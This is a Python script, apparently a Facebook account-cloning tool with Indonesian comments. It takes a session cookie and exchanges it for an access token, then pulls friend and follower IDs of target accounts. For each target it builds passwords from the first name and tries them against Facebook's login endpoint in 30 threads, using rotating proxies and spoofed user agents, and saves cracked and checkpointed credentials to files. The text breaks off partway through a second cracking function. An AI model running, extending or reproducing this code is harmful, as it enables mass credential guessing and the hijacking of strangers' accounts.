    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
 
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
 
 

#------------[ 3ala ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
#------------------[ LOGO-HAMA ]-----------------#

os.system('clear')
print(logo)
print(b)
print('')
pass
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			ma = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			ma2 = json.loads(ma.text)['name']
			ma3 = json.loads(ma.text)['id']
			menu(ma2,ma3)
		except KeyError:
			login_c()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_c()
def login_c():
	try:
		os.system('clear')
		banner()
		asu = random.choice([m,k,h,b,u])
		os.system('clear')
		banner()
		your_cookies = input(' Cookie :  ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n ╰─  Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n ╰─  Login Berhasil | python BrayennnFB.py");exit()
			except Exception as e:
				print(" ╰─  Cookies Mokad Kontol")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo) 
  ##  print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
  ##  print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93mTODAY'S DATE :\033[1;92m "+date)
    print(f"""\033[1;32m[1] Start File Cloning         """)
   ## print(f"""\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mCHECK OK IDz   """)
    print("""\033[1;31m[0] exit""")
    HAMA = input('\033[1;33mCHOOSE :  ')
    if HAMA in ['11']:
        rcrack()
        dump_massal()
    elif HAMA in ['1']:
        crack_file()
    elif HAMA in ['2','02']:
        public()
    elif HAMA in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;92m================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;92m================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
    #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print(' \033[97;1m[\033[92;1m1\033[97;1m] CHECK CP IDZ ')
    print(' \033[97;1m[\033[92;1m2\033[97;1m] CHECK OK IDZ ')
    print(' \033[97;1m[\033[92;1m3\033[97;1m] EXIT ')
    print('\033[0;91m==================')
    kz = input(' \033[97;1m[\033[92;1m•\033[97;1m]CHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\033[0;91m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\033[0;91m==================')
            geeh = input(' \033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f' \033[97;1m[\033[92;1m•\033[97;1m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\033[0;91m==================')
            animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\033[0;91m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\033[0;91m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\033[0;91m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\033[0;91m==================')
                animation(' \033[97;1m[\033[92;1m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            nocp=0
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f'\033[97;1m[\033[92;1m•\033[97;1m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
            input('\033[97;1m[\033[92;1m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\033[0;91m==================')
        animation(' \033[97;1m[\033[92;1m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()
#-------------------[ CRACK-PUBLIK ]----------------#
# PUBLIC CRACK
def public():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
         jum = int(input('[?] CRACK ID LIMIT : '))
	except ValueError:
		print('{k}[✘] NOT PUBLIC ID ')
		exit()
	if jum<1 or jum>100:
		print('[✘] Your limit error')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input('[➤] INPUT PUBLIC '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{k}[✘] Error  ')
			exit()
	try:
		print('')
		print(f'[•] Total Id :{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print('[✘] No Internet connection ')
		back()
	except (KeyError,IOError):
		print(f'[✘] Not Public  {u}')
		time.sleep(3)
		back()
# FOLLOWER CRACK
def follower():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('\n\x1b[1;30m%s[%sMRBX%s]%s-----%s[%sMRBX%s]\n '%(H,P,H,P,H,P,H,))
	pil = input('[MRBX]  Inter User Id : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('[•] Total Id :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('[✘] No Connection  ')
		exit()
	except (KeyError,IOError):
		print('[✘] Followar Id Not Found  ')
		exit()

#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    o = input('\033[1;37mName File :\033[1;37m ')
    try:lin = open(o).read().splitlines()
    except:
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
  ##  print('\033[0;92m=============================')
    print("\033[1;37m[ 1 ] FAST")
    print("\033[1;37m[ 2 ] SLOW[BEST]")
    ##print("\033[97;1m[\033[92;1m3\033[97;1m] 3ALA \x1b[33m[3\x1b[33m] \x1b[33m[\033[0;92mMIX \x1b[36mID\x1b[33m]")
 ##   print('\033[0;92m=============================')
    hu = input('\033[97;1m\033[92;1m\033[97;1mCHOOSE :\033[92;1m ')
    if hu in ['100','0100']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['30','030']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['1','01']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
##    print('\033[0;92m==================')
    print("\033[1;37m[ 1 ] METHOD")
##  print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD \x1b[33m[2\x1b[33m] \x1b[33m[\033[0;92mSHOW \x1b[36mCP\x1b[33m]")
 ##   print('\033[0;92m==================')
    hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['267','0267']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
    print("")
    os.system('clear')
    print(logo)
 #   print('\033[1;37m-----------------------------------------------')
 #   print('Total IDs :' +str(len(id)))
 ##   print("\033[97;1m[\033[92;1m➢\033[97;1m] 3ALA \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mTIME\x1b[33m] : \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
#   ## print("\033[97;1m[\033[92;1m➢\033[97;1m] 3ALA \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mSTART \x1b[36mCRACKING\x1b[33m]")
 #   print('\033[1;37m-----------------------------------------------')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'112233')
                    pwv.append(frs+frs)
                    pwv.append(frs+'11')
                    pwv.append(frs+'0000')
                    pwv.append(frs+' '+frs)
                    pwv.append(frs+'2000')
                    pwv.append(frs+'2001‌')
                    pwv.append(frs+'2002')
                    pwv.append(frs+'2003')
                    pwv.append(frs+'2004')
                    pwv.append(frs+'2005')
                    pwv.append(frs+'2006')
                    pwv.append(frs+'2007')
                    pwv.append(frs+'123@')
                    pwv.append(frs+'1234@')
                    pwv.append(frs+'4321@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@121@')
                    pwv.append(frs+'@@@23942@@@?233')
                    pwv.append(frs+'@123@')
                    pwv.append(frs+'@12@')
                    pwv.append('123'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('12345'+frs)
                    pwv.append(frs+'112233445566')
                    pwv.append(frs+'1122334455')
                    pwv.append(frs+'11223344')
                    pwv.append(frs+'112233')
                    pwv.append(frs+'665544332211')
                    pwv.append(frs+'5544332211')
                    pwv.append(frs+'44332211')
                    pwv.append(frs+'1234567')
                    pwv.append(frs+'12345678')   
                    pwv.append(frs+'123456789')   
                    pwv.append(frs+'1234567890') 
                    pwv.append(frs+'123'+frs)   
                    pwv.append("1122"+frs+"1122")
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(frs+'112233')
                    pwv.append(frs+frs)
                    pwv.append(frs+'11')
                    pwv.append(frs+'0000')
                    pwv.append(frs+' '+frs)
                    pwv.append(frs+'2000')
                    pwv.append(frs+'2001‌')
                    pwv.append(frs+'2002')
                    pwv.append(frs+'2003')
                    pwv.append(frs+'2004')
                    pwv.append(frs+'2005')
                    pwv.append(frs+'2006')
                    pwv.append(frs+'2007')
                    pwv.append(frs+'123@')
                    pwv.append(frs+'1234@')
                    pwv.append(frs+'4321@')
                    pwv.append(frs+'@@@@')
                    pwv.append(frs+'@121@')
                    pwv.append(frs+'@@@23942@@@?233')
                    pwv.append(frs+'@123@')
                    pwv.append(frs+'@12@')
                    pwv.append('123'+frs)
                    pwv.append('1234'+frs)
                    pwv.append('12345'+frs)
                    pwv.append(frs+'112233445566')
                    pwv.append(frs+'1122334455')
                    pwv.append(frs+'11223344')
                    pwv.append(frs+'112233')
                    pwv.append(frs+'665544332211')
                    pwv.append(frs+'5544332211')
                    pwv.append(frs+'44332211')
                    pwv.append(frs+'1234567')
                    pwv.append(frs+'12345678')   
                    pwv.append(frs+'123456789')   
                    pwv.append(frs+'1234567890') 
                    pwv.append(frs+'123'+frs)
                    pwv.append("1122"+frs+"1122")
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    os.system("python nono.py")
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r \r \033[1;31mHOT-Ing  {P}{k}\033[1;36m{loop}\033[1;31m{P}  {P}{H}[\033[1;32mOK:-{ok}😳{P} \033[1;31mCP:-{cp}🥲 {P}\033[1;31m{x}  {bo}{'{}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ua = random.choice(ugen2)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update = {'Host':'p.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
            ses.headers.update = {'Host': 'm.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\n\033[1;31m[HOT-CP]  {idf} | {pw} \n{ua}')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\x1b[32 \033[1;34mHOT-OK]\033[1;32m   {idf} | \033[1;32m{pw} | {kuki}\n{ua}')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}\x1b[33m[\x1b[32mHOT\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m]{P} \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK/\x1b[36mCP\x1b[33m] \x1b[33m[\x1b[32m{ok}/\x1b[36m{cp}\x1b[33m] \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]  "),
    sys.stdout.flush()
    ua = random.choice(ugen2)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update = {'Host':'p.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
            ses.headers.update = {'Host': 'm.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
